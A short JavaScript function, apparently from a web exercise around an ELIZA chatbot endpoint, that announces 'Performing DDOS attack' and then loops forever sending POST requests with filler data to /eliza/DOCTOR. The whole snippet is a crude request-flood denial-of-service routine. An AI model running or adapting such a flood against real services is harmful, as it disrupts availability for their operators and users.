function dos() {
	$('#notif').html("Performing DDOS attack");
	while(true) {
		$.ajax("/eliza/DOCTOR", {
			type: "POST",
			data: { human : "AAAAAAAAAAAAAAAAAAAAAA" },
			dataType: "json"
		}).done(function(data) {
			$('#eliza').html(data.eliza);
		}).fail(function() {
			$('#eliza').html("Error");
		});
	}
}
